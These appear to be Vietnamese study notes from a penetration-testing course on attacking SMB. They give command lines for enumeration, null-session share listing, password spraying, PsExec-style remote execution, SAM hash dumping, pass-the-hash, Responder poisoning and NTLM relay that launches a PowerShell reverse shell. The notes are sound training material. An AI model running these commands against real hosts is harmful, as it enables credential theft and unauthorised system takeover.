# Tấn công SMB (Attacking SMB) — Tóm tắt đầy đủ

## Tổng quan

**SMB (Server Message Block)** là giao thức truyền thông dùng để chia sẻ file và máy in giữa các node trong mạng. Ban đầu SMB chạy trên **NetBIOS over TCP/IP (NBT)** qua cổng TCP 139 và UDP 137, 138. Từ Windows 2000, Microsoft cho phép SMB chạy trực tiếp trên **TCP cổng 445** mà không cần lớp NetBIOS. Hệ điều hành Windows hiện đại dùng SMB over TCP nhưng vẫn hỗ trợ NetBIOS như phương án dự phòng.

**Samba** là triển khai mã nguồn mở của giao thức SMB trên Unix/Linux, cho phép máy chủ Linux/Unix và máy trạm Windows dùng chung dịch vụ SMB.

**MSRPC (Microsoft Remote Procedure Call)** là giao thức thường liên quan đến SMB, cho phép thực thi hàm (procedure) trong tiến trình cục bộ hoặc từ xa mà không cần hiểu chi tiết giao thức mạng. RPC có thể dùng SMB named pipes làm kênh truyền tải.

Để tấn công SMB Server, ta có thể khai thác cấu hình sai, quyền hạn quá mức, lỗ hổng đã biết hoặc phát hiện lỗ hổng mới.

## 1. Thu thập thông tin (Enumeration)

Dùng Nmap quét cổng 139 và 445:

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Thông tin thu được từ Nmap:

- **Phiên bản SMB** (ví dụ: Samba smbd 4.6.2)
- **Hostname** (ví dụ: HTB)
- **Hệ điều hành** — suy ra từ triển khai SMB (Samba → Linux)
- **Chế độ ký (Message signing)** — bật hay bắt buộc
- **Thời gian hệ thống**

> **Lưu ý:** Khi mục tiêu là Windows, thông tin phiên bản thường không có trong kết quả Nmap; Nmap sẽ cố đoán phiên bản OS.

## 2. Cấu hình sai (Misconfigurations)

### 2.1. Xác thực ẩn danh (Null Session / Anonymous Authentication)

SMB có thể được cấu hình không yêu cầu xác thực (null session). Khi khai thác được, ta có thể liệt kê: shares, usernames, groups, permissions, policies, services...

Các công cụ hỗ trợ null session: **smbclient, smbmap, rpcclient, enum4linux**.

#### File Share

**smbclient** — liệt kê share với null session:

```bash
smbclient -N -L //10.129.14.128
```

| Tùy chọn | Mô tả |
|-----------|-------|
| `-N` | Sử dụng null session (không cần mật khẩu) |
| `-L` | Liệt kê các share trên server |

**smbmap** — liệt kê share kèm quyền truy cập:

```bash
smbmap -H 10.129.14.128
```

Ưu điểm: hiển thị **quyền (Permissions)** cho từng share (NO ACCESS, READ ONLY, READ WRITE).

Duyệt thư mục bên trong share:

```bash
smbmap -H 10.129.14.128 -r notes        # duyệt một cấp
smbmap -H 10.129.14.128 -R notes        # duyệt đệ quy
```

Tải xuống và upload file:

```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call (RPC)

**rpcclient** — tương tác RPC với null session:

```bash
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers     # liệt kê người dùng domain
```

Có thể thực hiện nhiều thao tác: liệt kê users, groups, thay đổi thuộc tính server...

#### Enum4linux

**enum4linux-ng** — công cụ tổng hợp, tự động hóa enumeration từ SMB sử dụng nmblookup, net, rpcclient, smbclient:

```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

Thông tin thu được:

- Tên Workgroup/Domain
- Thông tin người dùng
- Thông tin hệ điều hành
- Nhóm (Groups)
- Thư mục chia sẻ (Shares)
- Chính sách mật khẩu

## 3. Tấn công theo giao thức (Protocol Specifics Attacks)

### 3.1. Brute Force và Password Spraying

**Brute Force** — thử nhiều mật khẩu cho một tài khoản. Rủi ro: có thể bị **khóa tài khoản** khi vượt ngưỡng.

**Password Spraying** — phương pháp tốt hơn: thử **một mật khẩu phổ biến** cho danh sách nhiều username, tránh khóa tài khoản. An toàn khi thử 2-3 lần, chờ 30-60 phút giữa các lần.

**CrackMapExec (CME)** — hỗ trợ password spraying trên nhiều IP cùng lúc:

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

| Tùy chọn | Mô tả |
|-----------|-------|
| `-u` | File danh sách username |
| `-p` | Mật khẩu thử |
| `--local-auth` | Xác thực cục bộ (cho máy không tham gia domain) |
| `--continue-on-success` | Tiếp tục spray sau khi tìm thấy đăng nhập thành công |

---

### 3.2. Thực thi Lệnh từ xa (Remote Code Execution)

Khi có quyền Administrator trên Windows SMB Server, ta có thể thực hiện:

- Thực thi lệnh từ xa
- Trích xuất hash từ SAM Database
- Liệt kê người dùng đang đăng nhập
- Pass-the-Hash (PtH)

#### PsExec

**PsExec** (Microsoft Sysinternals) cho phép thực thi tiến trình trên hệ thống từ xa. Cơ chế hoạt động:

1. Triển khai dịch vụ Windows lên share `ADMIN$` trên máy đích.
2. Dùng giao diện DCE/RPC qua SMB truy cập Windows Service Control Manager API.
3. Khởi động dịch vụ PSExec trên máy đích.
4. Tạo named pipe để gửi lệnh đến hệ thống.

Các triển khai PsExec trên Linux:

| Công cụ | Mô tả |
|---------|-------|
| **Impacket PsExec** | Triển khai Python, dùng RemComSvc |
| **Impacket SMBExec** | Không dùng RemComSvc, tạo SMB server cục bộ để nhận output |
| **Impacket atexec** | Thực thi lệnh qua Task Scheduler |
| **CrackMapExec** | Tích hợp smbexec và atexec |
| **Metasploit PsExec** | Triển khai Ruby |

**Impacket PsExec:**

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```

Kết quả: nhận shell với quyền `nt authority\system`.

**CrackMapExec — thực thi lệnh:**

```bash
# Chạy CMD
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Chạy PowerShell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -X 'Get-Process'
```

| Tùy chọn | Mô tả |
|-----------|-------|
| `-x` | Chạy lệnh CMD |
| `-X` | Chạy lệnh PowerShell |
| `--exec-method` | Phương thức thực thi (smbexec, atexec) |

> **Lưu ý:** Nếu không chỉ định `--exec-method`, CME mặc định thử atexec; nếu thất bại, thử smbexec.

---

### 3.3. Liệt kê Người dùng đang Đăng nhập (Logged-on Users)

Dùng CME quét toàn bộ mạng để tìm người dùng đang đăng nhập:

```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Hữu ích khi nhiều máy dùng chung tài khoản local admin — giúp tăng tốc enumeration.

---

### 3.4. Trích xuất Hash từ SAM Database

**SAM (Security Account Manager)** là file cơ sở dữ liệu lưu mật khẩu người dùng, dùng để xác thực cục bộ và từ xa. Khi có quyền admin, ta trích xuất hash SAM để:

- Xác thực với tư cách người dùng khác
- Crack mật khẩu và thử tái sử dụng cho dịch vụ/tài khoản khác
- Thực hiện Pass-the-Hash

```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Kết quả trả về hash dạng: `Username:RID:LMHash:NTHash:::`

---

### 3.5. Pass-the-Hash (PtH)

Khi có **NTLM hash** nhưng không crack được, vẫn có thể xác thực qua SMB bằng kỹ thuật PtH — dùng hash thay cho mật khẩu plaintext:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Các công cụ hỗ trợ PtH: Impacket tools, SMBMap, CrackMapExec.

---

### 3.6. Tấn công Xác thực Cưỡng bức (Forced Authentication Attacks)

Tạo **SMB Server giả** để bắt hash NetNTLM v1/v2 của người dùng.

#### Responder

**Responder** là công cụ đầu độc LLMNR, NBT-NS và MDNS, có khả năng dựng dịch vụ giả (SMB, HTTP, FTP, SQL...) để đánh cắp hash NetNTLM.

```bash
responder -I <interface_name>
```

**Cơ chế hoạt động (trên Windows):**

1. Máy tính cần phân giải tên hostname của share.
2. Kiểm tra file hosts cục bộ → không tìm thấy.
3. Kiểm tra DNS cache cục bộ → không tìm thấy.
4. Gửi truy vấn đến DNS server → không tìm thấy.
5. Gửi **multicast query** đến tất cả thiết bị trong mạng (LLMNR/NBT-NS).
6. **Responder chặn và phản hồi** giả mạo, khiến nạn nhân gửi hash xác thực.

**Ví dụ:** Người dùng gõ sai `\\mysharefoder\` thay vì `\\mysharedfolder\` → phân giải tên thất bại → multicast → Responder bắt được hash NTLMv2.

#### Crack hash bắt được

Hash được lưu tại `/usr/share/responder/logs/`. Crack bằng hashcat module 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> **Lưu ý:** NTLMv2 sử dụng challenge ngẫu nhiên cả phía client và server cho mỗi lần tương tác, nên cùng một mật khẩu sẽ tạo ra các hash khác nhau.

#### NTLM Relay — khi không crack được hash

Nếu không crack được hash, có thể **relay** hash đến máy khác để xác thực và mạo danh người dùng.

**Bước 1:** Tắt SMB trong cấu hình Responder:

```bash
# Trong /etc/responder/Responder.conf
SMB = Off
```

**Bước 2:** Chạy impacket-ntlmrelayx:

```bash
# Dump SAM database (mặc định)
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Hoặc thực thi lệnh (ví dụ: reverse shell PowerShell)
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64_payload>'
```

| Tùy chọn | Mô tả |
|-----------|-------|
| `--no-http-server` | Không dựng HTTP server |
| `-smb2support` | Hỗ trợ SMBv2 |
| `-t` | Máy mục tiêu để relay |
| `-c` | Lệnh thực thi trên máy mục tiêu |

Khi nạn nhân xác thực đến server giả, Responder đầu độc phản hồi và ntlmrelayx relay hash đến máy mục tiêu → dump SAM hoặc nhận reverse shell với quyền `nt authority\system`.

Tạo reverse shell PowerShell base64 bằng: https://www.revshells.com/

Nhận kết nối:

```bash
nc -lvnp 9001
```

## 4. RPC — Thay đổi Hệ thống

Ngoài enumeration, RPC còn cho phép **thực hiện thay đổi** trên hệ thống:

- Đổi mật khẩu người dùng
- Tạo người dùng domain mới
- Tạo thư mục chia sẻ mới

> **Lưu ý:** Cần cấu hình cụ thể trên hệ thống mới cho phép thay đổi qua RPC.

---

## Tóm tắt các phương pháp tấn công SMB

| Phương pháp | Công cụ chính | Mục đích |
|-------------|---------------|----------|
| **Enumeration** | Nmap, enum4linux-ng | Thu thập thông tin phiên bản, hostname, OS |
| **Null Session** | smbclient, smbmap, rpcclient | Liệt kê share, user, group, policy |
| **Password Spraying** | CrackMapExec | Dò mật khẩu an toàn, tránh khóa tài khoản |
| **RCE** | Impacket PsExec/SMBExec/atexec, CME | Thực thi lệnh từ xa với quyền SYSTEM |
| **SAM Dump** | CrackMapExec (`--sam`) | Trích xuất hash mật khẩu |
| **Pass-the-Hash** | CME, Impacket tools | Xác thực bằng hash thay vì mật khẩu |
| **Forced Auth** | Responder | Bắt hash NetNTLM v1/v2 |
| **NTLM Relay** | impacket-ntlmrelayx | Relay hash để dump SAM hoặc RCE |
| **RPC** | rpcclient | Enumeration và thay đổi hệ thống |
